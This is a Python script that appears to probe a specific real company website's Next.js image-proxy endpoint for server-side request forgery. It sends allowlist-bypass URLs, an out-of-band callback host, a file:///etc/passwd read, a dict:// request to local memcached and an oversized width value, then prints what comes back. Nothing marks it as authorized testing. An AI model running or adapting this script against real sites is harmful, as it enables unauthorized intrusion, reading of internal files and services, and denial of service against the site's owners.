import requests, urllib.parse, time
S = requests.Session()
S.headers.update({"User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36","Accept":"*/*"})
B="https://www.infinitycapital.bh/_next/image"
CASES = [
 ("cdn_contentful","https://cdn.contentful.com/yts1dx0j7jj5/1GCT0vyjqmOwmOwmOwm/x.jpg"),
 ("ctf_sub","https://images.ctfassets.net/yts1dx0j7jj5/1GCT0vyjqmOwmOwmOwm/x.jpg"),
 ("ctf_upper","https://IMAGES.CTFASSETS.NET/yts1dx0j7jj5/x.jpg"),
 ("ctf_trail","https://images.ctfassets.net.evil.invalid/x.jpg"),
 ("ctf_at","https://images.ctfassets.net.oob81eecdac4072.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in/x.jpg"),
 ("file_etc","file:///etc/passwd"),
 ("dict","dict://127.0.0.1:11211/stat"),
 ("w_param","VARY"),
]
for tag,u in CASES:
    if tag=="w_param":
        url=B+"?url="+urllib.parse.quote("https://images.ctfassets.net/yts1dx0j7jj5/1GCT0vyjqmOwmOwmOwm/x.jpg",safe="")+"&w=99999999&q=99"
    else:
        url=B+"?url="+urllib.parse.quote(u,safe="")+"&w=640&q=75"
    try:
        r=S.get(url,timeout=40,allow_redirects=False)
        print("%-14s %s len=%-7d ct=%-16s %r" % (tag,r.status_code,len(r.content),r.headers.get('content-type','')[:16],r.content[:70]))
    except Exception as e: print(tag,"ERR",e)
    time.sleep(2)
